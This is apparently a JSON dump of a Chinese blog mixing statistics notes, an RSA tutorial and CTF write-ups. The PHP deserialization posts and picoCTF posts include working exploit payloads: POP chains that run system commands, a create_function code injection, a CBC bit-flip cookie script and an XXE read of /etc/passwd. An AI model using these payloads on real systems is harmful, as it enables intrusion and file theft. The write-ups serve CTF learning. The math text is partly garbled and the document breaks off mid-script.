常用统计量的分布\n标准正态分布\n\n分布\n\n分布的定义：设相互独立，且均服从标准正态分布，则称服从自由度为的分布，记为，其密度函数为\n\n\\begin{align}\nf(x)=\n\\begin{cases}\n\\frac{1}{2^{\\frac{n}{2}}\\Gamma(\\frac{n}{2})}e^{-\\frac{x}{2}}x^{\\frac{n}{2}-1}&x>0\\\\\n0&x\\leqslant0\\\\\n\\end{cases}\n\\end{align}\n分布的性质\n\n可加性：若，且与相互独立，则\n若，则\n\n\n\n\n分布\n\n分布的定义：设，且与相互独立，则称服从自由度为的分布，记作，密度函数为\n分布的性质\n\n这表明当充分大时，自由度为的分布可以近似地看成是标准正态分布\n一般地，当时，就可以将分布作为标准正态分布\n\n\n\n\n分布\n\n分布的定义：设，且与相互独立，则称服从自由度为的分布，记为，其密度函数为\n\n\\begin{align}\nf(x)=\n\\begin{cases}\n\\frac{\\Gamma(\\frac{m+n}{2})}{\\Gamma(\\frac{m}{2})\\Gamma(\\frac{n}{2})}\nm^{\\frac{m}{2}}n^{\\frac{n}{2}}x^{\\frac{n}{2}-1}(m+nx)^{-\\frac{m+n}{2}}\n&x>0\\\\\n0&x\\leqslant0\\\\\n\\end{cases}\n\\end{align}\n分布的性质\n\n若，则\n若，则\n\n\n\n\n\n6.3 正态总体的抽样分布\n单正态总体的抽样分布定理：设总体，为总体的简单随机样本，样本均值，样本方差，则有\n\n，且与相互独立\n\n\n\n双正态总体的抽样分布定理：设总体与总体相互独立，与分别为总体与总体的简单随机样本，以分别表示两样本的样本均值与样本方差，则有\n\n\n若，则，其中\n\n\n\n6.4 抽样分布的上分位点\n标准正态分布分位点的定义：设随机变量，若对，实数满足，则称为标准正态分布的上分位点，由于标准正态分布的密度函数为偶函数，可知\n分布分位点的定义：设随机变量，若对，实数满足，则称点为的上分位点，易知\n分布分位点的定义：设随机变量，若对，实数满足，则称点为的上分位点，类似于标准正态分布，有\n分布分位点的定义：设随机变量，若对，实数满足，则称点为的上分位点，易知\n几个基本等式：设为一个连续型随机变量，若对，实数满足，则称点为的上分位点\n\n\n$P\\{YY_{\\alpha/2}\\}=\\alpha$\n\n\n\n\n\n\n","categories":["Vulnerability_recurrence"],"tags":["Study","Mathematical statistics","Probability theory"]},{"title":"概率论与数理统计知识梳理（六）","url":"/2023/04/14/Probability-theory-and-mathematical-statistics_Chapter_7/","content":"概率论与数理统计第七章 参数的点估计及其优良性7.1 点估计\n设总体的分布函数形式已知，其中含有一个未知参数，为了估计参数，首先从总体中抽取样本，然后按照一定的方法苟傲合适的统计量作为的估计量，记为。代入样本观测值，即得到的估计值\n矩估计法：设总体的分布为，为待估计参数，为来自总体的样本。如果总体的数学期望存在，那么一般来说应为的函数。由于相互独立且与总体同分布，则由大数定律知时，样本均值，依概率收敛于总体均值，于是可令，即，再解次方程求出即可\n可以看作是用样本一阶矩完成对总体一阶矩的估计\n\n\n最大似然估计法\n似然函数的定义：设为来自总体的简单随机样本，为样本观测值，称为参数的似然函数\n似然函数实际上就是样本恰好取观测值（或其邻域）的规律\n最大似然估计量的定义：设为参数的似然函数，若存在一个只与样本观测值有关的实数，使得，则称为参数的最大似然估计值，称为参数的最大似然估计量\n一般会求对数似然函数来降低计算难度\n\n\n\n7.2 点估计优良性的评定标准\n无偏性\n希望估计量在多次试验的结果中，在待估参数的附近摆动，并使得这个估计量的平均值恰好就是待估的参数\n若参数的估计量满足，则称为的一个无偏估计量，否则就称为有偏估计量\n无偏性是对估计量的基本要求，它具有系统误差为0的特点\n\n\n有效性\n设和都是参数的无偏估计量，如果，则称比有效\n有效性的定义指明，在期望相等的条件下，方差小者估计的效果更好\n\n\n一致性（相合性）\n估计量与样本容量有关，记为，一般来说，当越大，的取值与的误差应越小，即当充分大时，估计量的取值应该稳定在参数的一个充分小的领域内\n设是的一个估计量，若对于任意的，有，则称是的一致估计量（相合估计量）\n\n\n\n","categories":["Homomorphic encryption"],"tags":["Study","Homomorphic encryption","ElGamal"]},{"title":"Do u know RSA?","url":"/2023/03/22/RSA/","content":"RSA概述RSA是一种非对称加密算法，在公开密钥加密和电子商业中RSA被广泛使用。公钥（Public Key）与私钥（Private Key）是通过一种算法得到的一个密钥对（即一个公钥和一个私钥），公钥是密钥对中公开的部分，私钥则是非公开的部分。公钥通常用于加密会话密钥、验证数字签名，或加密可以用相应的私钥解密的数据。\n预备知识模运算 mod在正整数范围内选取a，b，分别对另一个正整数n进行取余运算，得到，，如果，则称a与b关于n同余，记作\n模逆运算如果正整数a，b，n满足，则称a与b互为模n的逆元，记作\npython实现：\nfrom gmpy2 import *a = 114514n = 1919810b = invert(a,n)#b即为a关于n的逆元\n其余模运算基本原理可以参照这篇文章：https://blog.sengxian.com/algorithms/mod-world\n欧拉函数 phi的值表示小于等于n的正整数之中，有多少个数与n构成互质关系。\n1.若，则，因为1与任何数都构成互质关系\n2.若为质数，则，因为任何一个质数与小于它的所有数都构成互质关系\n3.若，其中p为质数，则\n4.若可以分解成两个互质的整数之积，即n，则。\n欧拉定理若两个正整数a和n互质，则n的欧拉函数  可以让下面的等式成立：当n为质数时，欧拉定理可以化为： 这就是费马小定理，它是欧拉定理的特例。\n\nHow to ENCRYPT?1.首先，我们选取两个不相同的大素数p和q，并计算\n2.计算\n3.选取一个小于，且与互质的不太小的正整数e\n4.计算e在模n下的逆元d，即\n5.(n, e)封装为公钥，(p, q, d)封装为私钥\n6.将密文转码为十六进制数据m\n7.，c即为可以传输的密文\n至此RSA加密完成\n\nHow to DECRYPT?最简单的情况：已知p，q，e，c\n1.计算\n2.计算逆元\n3.\n即可得到明文\n\n解密算法证明分两种情况证明，与，\nm与n互质\n\\begin{align}\nc^d&=m^{ed}\\\\\n&=m^{k\\phi(n)+1}&(mod\\ n)\\\\\n\\because ed&=1&(mod\\ \\phi(n))\\\\\n\\therefore c^d&=[m(m^{\\phi(n)}\\ (mod\\ n))^k]\\\\\n&=m&(mod\\ n)\\\\\n&=m\\\\\n\\end{align}m与n不互质由于m与n不互质，所以m与n必定有一个大于1的公因子，而由于，且p与q均为质数，所以，\n由于\n\n\\begin{align}\nm^{ed}&=m^{k\\phi(n)+1}\\\\\n&=m^{k(p-1)(q-1)+1}\\\\\n&=m(m^{q-1}\\ (mod\\ q))^{k(p-1)}\\\\\n&=m&(mod\\ q)\\\\\n\\end{align}即\n假设，则有\n\n\\begin{align}\nm^{ed}&={(cp)}^{ed}\\\\\n&=0&(mod\\ p)\\\\\n\\because m\\ mod\\ p&=0\\\\\n\\therefore tq\\ mod\\ p&=0\\\\\n\\because gcd(p,q)&=1\\\\\n\\therefore t&=rp&(t\\in N^{*})\\\\\n\\end{align}由此可以得到\n\n\\begin{align}\nm^{ed}&=(m+tq)\\\\\n&=(m+rpq)\\\\\n&=(m+rn)&(mod\\ n)\\\\\n&=m\\\\\n\\end{align}至此证明完毕\n","categories":["CTF"],"tags":["CTF","CRYPTO","RSA"]},{"title":"PHP反序列化-[QWB 2021]","url":"/2023/03/12/easy-pop/","content":"easy_pop ([QWB 2021] - 赌徒)Analyze进一下端口，只得到I think you need /etc/hint . Before this you need to see the source code，下载一下备份文件/www.zip，得到index.php\n#index.php&lt;meta charset=\"utf-8\"&gt;&lt;?php//hint is in hint.phperror_reporting(1);class Start{    public $name='guest';    public $flag='syst3m(\"cat 127.0.0.1/etc/hint\");';\t    public function __construct(){        echo \"I think you need /etc/hint . Before this you need to see the source code\";    }    public function _sayhello(){        echo $this-&gt;name;        return 'ok';    }    public function __wakeup(){        echo \"hi\";        $this-&gt;_sayhello();    }    public function __get($cc){        echo \"give you flag : \".$this-&gt;flag;        return ;    }}class Info{    private $phonenumber=123123;    public $promise='I do';\t    public function __construct(){        $this-&gt;promise='I will not !!!!';        return $this-&gt;promise;    }    public function __toString(){        return $this-&gt;file['filename']-&gt;ffiillee['ffiilleennaammee'];    }}class Room{    public $filename='/flag';    public $sth_to_set;    public $a='';\t    public function __get($name){        $function = $this-&gt;a;        return $function();    }\t    public function Get_hint($file){        $hint=base64_encode(file_get_contents($file));        echo $hint;        return ;    }    public function __invoke(){        $content = $this-&gt;Get_hint($this-&gt;filename);        echo $content;    }}if(isset($_GET['hello'])){    unserialize($_GET['hello']);}else{    $hi = new  Start();}?&gt;\n从代码中分析可以看出，给hello传参，然后进行序列化攻击。通过对魔术方法和序列化的的学习，我们只能从Start这个类开始下手，当对这个该类进行反序列化时，会自动执行wakeup()方法，而这3个类中只有Start类存在这个方法。再继续观察发现，我们最终需要达到的目的地是Room类的Get_hint()方法。\n所以可以构造payload：\n&lt;?phpinclude \"index.php\";$a = new Start();\t\t\t// __wakeup()进入，$a-&gt;name = new Info();\t\t// Info的__toString()进入$a-&gt;name-&gt;file[\"filename\"] = new Room();\t// Room的__get()进入$a-&gt;name-&gt;file[\"filename\"]-&gt;a= new Room();\t// Room的__invoke()进入echo \"&lt;br&gt;\";echo serialize($a);?&gt;\n序列化后可以得到O:5:\"Start\":2:{s:4:\"name\";O:4:\"Info\":3:{s:17:\"Infophonenumber\";i:123123;s:7:\"promise\";s:15:\"I will not !!!!\";s:4:\"file\";a:1:{s:8:\"filename\";O:4:\"Room\":3:{s:8:\"filename\";s:5:\"/flag\";s:10:\"sth_to_set\";N;s:1:\"a\";O:4:\"Room\":3:{s:8:\"filename\";s:5:\"/flag\";s:10:\"sth_to_set\";N;s:1:\"a\";s:0:\"\";}}}}s:4:\"flag\";s:33:\"syst3m(\"cat 127.0.0.1/etc/hint\");\";}\n反序列化的结果是一片空白，再仔细查看payload发现是Infophonenumber出现了问题，添加上%00即可\n完整payload：/?hello=O:5:\"Start\":2:{s:4:\"name\";O:4:\"Info\":3:{s:17:\"%00Infop%00honenumber\";i:123123;s:7:\"promise\";s:15:\"I will not !!!!\";s:4:\"file\";a:1:{s:8:\"filename\";O:4:\"Room\":3:{s:8:\"filename\";s:5:\"/flag\";s:10:\"sth_to_set\";N;s:1:\"a\";O:4:\"Room\":3:{s:8:\"filename\";s:5:\"/flag\";s:10:\"sth_to_set\";N;s:1:\"a\";s:0:\"\";}}}}s:4:\"flag\";s:33:\"syst3m(\"cat 127.0.0.1/etc/hint\");\";}\n将得到的结果Base64解码后即可得到flag\n","categories":["CTF"],"tags":["CTF","WEB","PHP unserialize"]},{"title":"PHP反序列化-[祥云杯2021 ez_yii]","url":"/2023/03/22/ez-yii/","content":"ez_yii [祥云杯2021]Analyze先上题\nindex.php\n&lt;?phpinclude(\"closure/autoload.php\");function myloader($class){    require_once './class/' . (str_replace('\\\\', '/', $class) . '.php');}spl_autoload_register(\"myloader\"); error_reporting(0);if($_POST['data']){    unserialize(base64_decode($_POST['data']));}else{\techo \"&lt;h1&gt;某ii最新的某条链子&lt;/h1&gt;\";}\nautoload.php\n&lt;?php/* =========================================================================== * Copyright (c) 2018-2019 Zindex Software * * Licensed under the MIT License * =========================================================================== */require_once 'functions.php';spl_autoload_register(function($class){       $class = ltrim($class, '\\\\');    $dir = __DIR__ . '/src';    $namespace = 'Opis\\Closure';        if(strpos($class, $namespace) === 0)    {        $class = substr($class, strlen($namespace));        $path = '';        if(($pos = strripos($class, '\\\\')) !== FALSE)        {            $path = str_replace('\\\\', '/', substr($class, 0, $pos)) . '/';            $class = substr($class, $pos + 1);        }        $path .= str_replace('_', '/', $class) . '.php';        $dir .= '/' . $path;                if(file_exists($dir))        {            include $dir;            return true;        }                return false;    }        return false;});\nfunctions.php\n&lt;?php/* =========================================================================== * Copyright (c) 2018-2019 Zindex Software * * Licensed under the MIT License * =========================================================================== */namespace Opis\\Closure;/** * Serialize * * @param mixed $data * @return string */function serialize($data){    SerializableClosure::enterContext();    SerializableClosure::wrapClosures($data);    $data = \\serialize($data);    SerializableClosure::exitContext();    return $data;}/** * Unserialize * * @param string $data * @param array|null $options * @return mixed */function unserialize($data, array $options = null){    SerializableClosure::enterContext();    $data = ($options === null || \\PHP_MAJOR_VERSION &lt; 7)        ? \\unserialize($data)        : \\unserialize($data, $options);    SerializableClosure::unwrapClosures($data);    SerializableClosure::exitContext();    return $data;}\nRunProcess.php\n&lt;?phpnamespace Codeception\\Extension;class RunProcess{    protected $output;    protected $config = ['sleep' =&gt; 0];    protected static $events = [];    private $processes = [];    public function __destruct()#1    {        $this-&gt;stopProcess();    }    public function stopProcess()#2    {        foreach (array_reverse($this-&gt;processes) as $process) {            if (!$process-&gt;isRunning()) {                continue;            }            $this-&gt;output-&gt;debug('[RunProcess] Stopping ' . $process-&gt;getCommandLine());            $process-&gt;stop();        }        $this-&gt;processes = [];    }}\nDefaultGenerator.php\n&lt;?phpnamespace Faker;class DefaultGenerator{    protected $default;    public function __call($method, $attributes)    {           echo \"def\";        return $this-&gt;default;    }}\nAppendStream.php\n&lt;?phpnamespace GuzzleHttp\\Psr7;class AppendStream{    private $streams = [];#-7    private $seekable = true;    public function __toString()    {        $this-&gt;rewind();        return \"hahaha\";    }    public function rewind()    {        $this-&gt;seek(0);    }    public function seek($offset, $whence = SEEK_SET)    {        echo\"4\";        if (!$this-&gt;seekable) {            throw new \\RuntimeException('This AppendStream is not seekable');        } elseif ($whence !== SEEK_SET) {            throw new \\RuntimeException('The AppendStream can only seek with SEEK_SET');        }        $this-&gt;pos = $this-&gt;current = 0;        // Rewind each stream        foreach ($this-&gt;streams as $i =&gt; $stream) {            try {                $stream-&gt;rewind();#-6            } catch (\\Exception $e) {                throw new \\RuntimeException('Unable to seek stream '                    . $i . ' of the AppendStream', 0, $e);            }        }    }}\nCachingStream.php\n&lt;?phpnamespace GuzzleHttp\\Psr7;class CachingStream{    private $remoteStream;    private $skipReadBytes = 0;    public function rewind()#-5    {        $this-&gt;seek(0);    }    public function seek($offset)#-4    {        $byte = $offset;        $diff = $byte - $this-&gt;stream-&gt;getSize();        if ($diff &gt; 0) {            // Read the remoteStream until we have read in at least the amount            // of bytes requested, or we reach the end of the file.            while ($diff &gt; 0 &amp;&amp; !$this-&gt;remoteStream-&gt;eof()) {                $this-&gt;read($diff);                $diff = $byte - $this-&gt;stream-&gt;getSize();            }        } else {            // We can just do a normal seek since we've already seen this byte.            $this-&gt;stream-&gt;seek($byte);        }    }    public function read($length)    {        // Perform a regular read on any previously read data from the buffer        $data = $this-&gt;stream-&gt;read($length);        $remaining = $length - strlen($data);        // More data was requested so read from the remote stream        if ($remaining) {            // If data was written to the buffer in a position that would have            // been filled from the remote stream, then we must skip bytes on            // the remote stream to emulate overwriting bytes from that            // position. This mimics the behavior of other PHP stream wrappers.            $remoteData = $this-&gt;remoteStream-&gt;read(#-3                $remaining + $this-&gt;skipReadBytes            );            if ($this-&gt;skipReadBytes) {                $len = strlen($remoteData);                $remoteData = substr($remoteData, $this-&gt;skipReadBytes);                $this-&gt;skipReadBytes = max(0, $this-&gt;skipReadBytes - $len);            }            $data .= $remoteData;            $this-&gt;stream-&gt;write($remoteData);        }        return $data;    }}\nPumpStream.php\n&lt;?phpnamespace GuzzleHttp\\Psr7;class PumpStream{    private $source;    private $size;    private $tellPos = 0;    private $metadata;    private $buffer;    public function getSize()    {        return $this-&gt;size;    }    public function read($length)#-2    {        $data = $this-&gt;buffer-&gt;read($length);        $readLen = strlen($data);        $this-&gt;tellPos += $readLen;        $remaining = $length - $readLen;        if ($remaining) {            $this-&gt;pump($remaining);            $data .= $this-&gt;buffer-&gt;read($remaining);            $this-&gt;tellPos += strlen($data) - $readLen;        }        return $data;    }    private function pump($length)#-1    {        if ($this-&gt;source) {            do {                $data = call_user_func($this-&gt;source, $length);                if ($data === false || $data === null) {                    $this-&gt;source = null;                    return;                }                $this-&gt;buffer-&gt;write($data);                $length -= strlen($data);            } while ($length &gt; 0);        }    }}\n这次的代码比较多，需要进行一点点剖析\n进行逆向分析：\n首先观察到在PumpStream.php中存在函数call_user_func()，可以考虑利用，往上逐个观察，函数call_user_func()在函数pump()中，再次往上，函数read()在if($remaining)的条件下会调用函数pump()\n全局搜索函数read()，在CachingStream.php中找到了同名函数read()，可以将其作为跳板，而在函数seek()中，调用了函数read()，又在函数rewind()中被调用\n再次全局搜索函数rewind()，在AppendStream.php中找到了同名函数rewind()，又可以作为跳板\n进行正向分析：\n在RunProcess.php中，函数__destruct()调用了函数stopProcess()，可以联想到使用函数__call()，发现在DefaultGenerator.php中，发现还需要一个函数__toString()，可以在AppendStream.php中找到\n正向逆向分析完成，可以得到如下POP链\n// RunProcess-&gt;__destruct()-&gt;stopProcess()// -&gt;DefaultGenerator-&gt;__call()// -&gt;AppendStream-&gt;__toString()-&gt;rewind()-&gt;seek()// -&gt;CachingStream-&gt;rewind()-&gt;seek()-&gt;read()// -&gt;PumpStream-&gt;read()-&gt;pump()-&gt;call_user_func()\nPOC&lt;?php // RunProcess-&gt;__destruct()-&gt;stopProcess()// -&gt;DefaultGenerator-&gt;__call()// -&gt;AppendStream-&gt;__toString()-&gt;rewind()-&gt;seek()// -&gt;CachingStream-&gt;rewind()-&gt;seek()-&gt;read()// -&gt;PumpStream-&gt;read()-&gt;pump()-&gt;call_user_func()namespace Codeception\\Extension{    use Faker\\DefaultGenerator;    use GuzzleHttp\\Psr7\\AppendStream;    use GuzzleHttp\\Psr7\\CachingStream;    use GuzzleHttp\\Psr7\\PumpStream;    class RunProcess    {        protected $output;        private $processes = ['aaa'=&gt;1];        public function __construct($def=0)        {            echo \"runprocess~~~~~~~~~~~~~~~~~~\";            $this-&gt;output=$def;            $this-&gt;processes['aaa']=$def;                    }    }    $pum=new PumpStream;    $cac=new CachingStream($pum);    $app=new AppendStream($cac);    $def=new DefaultGenerator($app);    $run=new RunProcess($def);    $payload = serialize($run);    echo base64_encode($payload);}namespace Faker{    use GuzzleHttp\\Psr7\\AppendStream;    use GuzzleHttp\\Psr7\\CachingStream;    class DefaultGenerator    {        protected $default;        public function __construct($app=0)        {            echo \"faker~~~~~~~~~~~~~~~~~~\";            $this-&gt;default = $app;        }    }}namespace GuzzleHttp\\Psr7{    class AppendStream    {        private $streams=[];        public function __construct($cac=0)        {            echo \"appengstream~~~~~~~~~~~~~~~~~~\";            $this-&gt;streams[]=$cac;        }    }}namespace GuzzleHttp\\Psr7{    use Faker\\DefaultGenerator;    use GuzzleHttp\\Psr7\\PumpStream as Psr7PumpStream;    class CachingStream    {        private $remoteStream;        public function __construct($pum=0)        {            echo \"cachingstream~~~~~~~~~~~~~~~~~~\";            $this-&gt;stream=$pum;            $this-&gt;remoteStream=new DefaultGenerator(NULL);        }    }    class PumpStream    {        private $source;        private $size;        private $tellPos = 0;        private $metadata;        private $buffer;        public function __construct()        {            echo \"pumpstream~~~~~~~~~~~~~~~~~~\";            include(\"closure/autoload.php\");            $this-&gt;size=-1;            $def=new DefaultGenerator('aaaaaa');            $this-&gt;buffer=new CachingStream($def);            $fun=function()            {                system(\"cd / &amp;&amp; cat flag\");            };            $f=(\\Opis\\Closure\\serialize($fun));            $this-&gt;source=unserialize($f);        }    }}\n反序列化后对data进行POST传参即可得到flag\n","categories":["CTF"],"tags":["CTF","WEB","PHP unserialize"]},{"title":"PHP反序列化-eval()","url":"/2023/03/13/ez_unserialize/","content":"ez_unserializeAnalyze先上题：\n&lt;?phperror_reporting(0);highlight_file(__FILE__);class User{    private $username='name';    private $password='password';    private $class = 'info';    public function __construct(){        $this-&gt;class=new info();    }    public function login($u,$p){        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p){            echo \"successfully login\";        }    }    public function __destruct(){        $this-&gt;class-&gt;getInfo();    }}class info{    private $user='xxxxxx';    public function getInfo(){        return $this-&gt;user;    }}class evil{    private $code;    public function getInfo(){        eval($this-&gt;code);    }}$username=$_GET['username'];$password=$_GET['password'];if(isset($username) &amp;&amp; isset($password)){    $user = unserialize($_COOKIE['user']);    $user-&gt;login($username,$password);}\n先找到反序列化的地方$user = unserialize($_COOKIE['user']);，所以是对user进行cookie注入，可以使用cookie editor等插件\n观察到evil类中有eval()函数，其作用是将字符串参数当做代码来执行，所以可以在这里进行攻击\nUser类的构造函数会生成一个新的对象，所以可以在这里改为$this-&gt;class=new evil();\nEXP#payload&lt;?phperror_reporting(0);// highlight_file(__FILE__);class User{    private $username='name';    private $password='password';    private $class;    public function __construct(){        $this-&gt;class=new evil();    }    public function login($u,$p){        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p){            echo \"successfully login\";        }    }    public function __destruct(){        $this-&gt;class-&gt;getInfo();    }}class info{    private $user='xxxxxx';    public function getInfo(){        return $this-&gt;user;    }}class evil{    private $code=\"system('cat flag.php');\";    public function getInfo(){        eval($this-&gt;code);    }}$username=$_GET['username'];$password=$_GET['password'];if(isset($username) &amp;&amp; isset($password)){    $user = unserialize($_COOKIE['user']);    $user-&gt;login($username,$password);}$a=new User();echo(urlencode(serialize($a)));?&gt;    #output(cookie)user=O%3A4%3A%22User%22%3A3%3A%7Bs%3A14%3A%22%00User%00username%22%3Bs%3A4%3A%22name%22%3Bs%3A14%3A%22%00User%00password%22%3Bs%3A8%3A%22password%22%3Bs%3A11%3A%22%00User%00class%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D/?username=name&amp;password=password\n即可得到flag\n","categories":["CTF"],"tags":["CTF","WEB","PHP unserialize"]},{"title":"PHP反序列化-hellounser","url":"/2023/03/22/hellounser/","content":"hellounser [DASCTF 2021 Sept]Analyze先上题\n&lt;?phpclass A {    public $var;    public function show(){        echo $this-&gt;var;    }    public function __invoke(){        $this-&gt;show();    }}class B{    public $func;    public $arg;        public function show(){        $func = $this-&gt;func;        if(preg_match('/^[a-z0-9]*$/isD', $this-&gt;func) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i', $this-&gt;arg)) {             die('No!No!No!');         } else {             include \"flag.php\";            //There is no code to print flag in flag.php            $func('', $this-&gt;arg);         }    }        public function __toString(){        $this-&gt;show();        return \"&lt;br&gt;\".\"Nice Job!!\".\"&lt;br&gt;\";    }        }if(isset($_GET['pop'])){    $aaa = unserialize($_GET['pop']);    $aaa();}else{    highlight_file(__FILE__);}?&gt;\n稍加分析，在类B中，函数show()包含了flag.php，而函数__toString()调用了函数show()，\n\n__toString()：类被当成字符串时的回应方法\n\n而在类A中，函数show()会输出字符串var，那么我们可以将var定义为B的对象，而类A中的函数show()又被函数__invoke()调用\n\n__invoke()：调用函数的方式调用一个对象时的回应方法\n\nPOP链清晰了，那么现在就看看如何获取flag，很显然，我们既不能满足preg_match('/^[a-z0-9]*$/isD', $this-&gt;func)，又不能满足preg_match('...', $this-&gt;arg)，前一个正则表达式限制了func不能为纯字母或数字，i为不区分大小写，s为匹配任何不可见字符，包括空格、制表符、换页符…，等价于[fnrtv]，D为如果使用$限制结尾字符,则不允许结尾有换行，而后一个则是普通的字符过滤。\n在这里可以考虑使用函数create_function()\n\nfcreate_function()：会创造一个匿名函数 （lambda样式），且会在内部调用函数eval()\n\n进行代码注入：return(1);}???;//\n随后进行简单的绕过即可\nPOC&lt;?phpclass A {    public $var;    public function show()    {        echo $this-&gt;var;    }    public function __invoke()    {        $this-&gt;show();    }}class B{    public $func;    public $srg;    public function __toString()    {        $this-&gt;show();    }}$a=new A();$b=new B();$ac=(~('php://filter/read=convert.base64-encode/resource=Tru3flag.php'));$b-&gt;func=\"create_function\";$b-&gt;arg='return(1);}require(~('.strval($ac).'));//';$a-&gt;var=$b;echo urlencode(serialize($a));\n","categories":["CTF"],"tags":["CTF","WEB","PHP unserialize"]},{"title":"Hello World","url":"/2021/05/01/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\nMore info: Writing\nRun server$ hexo server\nMore info: Server\nGenerate static files$ hexo generate\nMore info: Generating\nDeploy to remote sites$ hexo deploy\nMore info: Deployment\n","categories":["Hello world"],"tags":["Hello world"]},{"title":"picoCTF Day","url":"/2023/04/14/picoCTF%20Day%201/","content":"-&gt;WEBGET aHEAD\nJust click the Choose Blue button and intercept with BurpSuite, change the request method from POST to  HEAD, and the server will return the flag\npicoCTF{r3j3ct_th3_du4l1ty_70bc61c4}\nCookie\nWhen we first enter the challenge, we can find a page for us to enter something to search for the cookie\n\nAnd if we check the value of the Cookie, there is only one name=-1\n\nSince the default option is snickerdoodle, then we just type it in, it respond another page, saying I love snickerdoodle cookies!, and the current value of cookie is name=0\n\nThus, we can try different values of name with the Intruder module of BurpSuite,  check the length of the response, and the flag occurred\n\npicoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}\nInsp3ct0r\nWhen we first enter the page, we can get Inspect and HTML/CSS/JS\n\nThen, if we check the source code, we can find the flag\n\nThe first part of the flag\n\n\n\nThe second part of the flag\n\n\n\nThe third part of the flag\n\n\npicoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?832b0699}\nScavenger Hunt\nStill the same frame, check the sources as usual\n\n\nThe first part of the flag\n\n\n\nThe second part of the flag\n\n\n\nThe third part of the flag\n\n\nThough we didn’t find the flag easily, but we get one hint, Avoid the searching engine indexing the website, we can easily link it with the robots.txt, just visit it and we can get the part and the hint for the next one\n\n\nThe fourth part of the flag\n\nWe can easily link Apache Server Approachable Resources with .htaccess, and yes, it’s the right path\n\n\nThe fifth part of the flag\n\nStill the same, link Mac Store with .DS_Store\n\npicoCTF{th4ts_4_l0t_0f_pl4c3s_2_lO0k_74cceb07}\nSome Assembly Required 1\nJust check the sources, and we will find the flag at the bottom\n\npicoCTF{cb688c00b5a2ede7eaedcae883735759}\nMore Cookies\nGo to the page and check the value of the cookie auth_name:STdHL0M3VGVhKzNMcFlUelFydlZiNUVQWG53blV5eVBNWHdSZzlYZXVVQWdoaDU1U0hvSnRzenF4VEFWbC8ySWpLVFlJNStpUEZURTZ6WFhtdk9wVHRLWWdjNWFyVFhDNmFHZ3lWMm5Zd0RYWmdBdElTREV5bWdaZk9BRnFJYzI=, I’ve tried to decode it with Base64, but it returns something weird. Then I go back to the description and find the hint of a Wikipedia page of Homomorphic_encryption, and the description has three oddly capitalized letters CBC, I link it with the CBC Bitflip Attack, the following is the crack script.\nfrom base64 import b64decode, b64encodeimport requestsdef bit_flip(pos, bit, data):    raw = b64decode(b64decode(data).decode())    list1 = bytearray(raw)    list1[pos] = list1[pos] ^ bit    raw = bytes(list1)    return b64encode(b64encode(raw)).decode()url = 'http://mercury.picoctf.net:43275/'cookie = 'STdHL0M3VGVhKzNMcFlUelFydlZiNUVQWG53blV5eVBNWHdSZzlYZXVVQWdoaDU1U0hvSnRzenF4VEFWbC8ySWpLVFlJNStpUEZURTZ6WFhtdk9wVHRLWWdjNWFyVFhDNmFHZ3lWMm5Zd0RYWmdBdElTREV5bWdaZk9BRnFJYzI='for position_idx in range(0, 10):    for bit_idx in [0, 1]:        auth_cookie = bit_flip(position_idx, bit_idx, cookie)        print(auth_cookie)        cookArr = {'auth_name': auth_cookie}        r = requests.get(url, cookies=cookArr, timeout=(10, 10))        if \"picoCTF{\" in r.text:            print(r.text)            break\npicoCTF{cO0ki3s_yum_1b75d657}\nwhere are the robots\nAt the first sight of robots, robots.txt jumped to me, just visit it and we can capture the flag\n\n\n\npicoCTF{ca1cu1at1ng_Mach1n3s_477ce}\nlogon\nJust login with any Username and Password, then edit the value of Admin in the cookies from False to True, and the flag will occur\npicoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}\ndont-use-client-side\nCheck the source code and link the parts of the flag\n\npicoCTF{no_clients_plz_1a3c89}\n","categories":["CTF"],"tags":["CTF","WEB","picoCTF"]},{"title":"picoCTF Day","url":"/2023/04/18/picoCTF%20Day%202/","content":"-&gt;WEBIt is my birthdaypicoCTF{c0ngr4ts_u_r_1nv1t3d_aebcbf39}\nWho are you?picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_79e451a7}\nloginpicoCTF{53rv3r_53rv3r_53rv3r_53rv3r_53rv3r}\nIncludespicoCTF{1nclu51v17y_1of2_f7w_2of2_df589022}\nInspect HTMLpicoCTF{1n5p3t0r_0f_h7ml_fd5d57bd}\nLocal AuthoritypicoCTF{j5_15_7r4n5p4r3n7_a8788e61}\nSearch sourcepicoCTF{1nsp3ti0n_0f_w3bpag3s_ec95fa49}\nfindmepicoCTF{proxies_all_the_way_d1c0b112}\nMatchTheRegexpicoCTF{succ3ssfully_matchtheregex_2375af79}\nSOAPPOST /data HTTP/1.1Host: saturn.picoctf.net:65394Content-Length: 142User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36Content-Type: application/xmlAccept: */*Origin: http://saturn.picoctf.net:65394Referer: http://saturn.picoctf.net:65394/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;data&gt;&lt;ID&gt;&amp;test;&lt;/ID&gt;&lt;/data&gt;\npicoCTF{XML_3xtern@l_3nt1t1ty_0dcf926e}\n ","categories":["CTF"],"tags":["CTF","WEB","picoCTF"]},{"title":"pqpq [SECCON2022]","url":"/2023/03/22/pqpq/","content":"pqpq [SECCON2022]Analyze先上题\nfrom Crypto.Util.number import *from Crypto.Random import *from flag import flagp = getPrime(512)q = 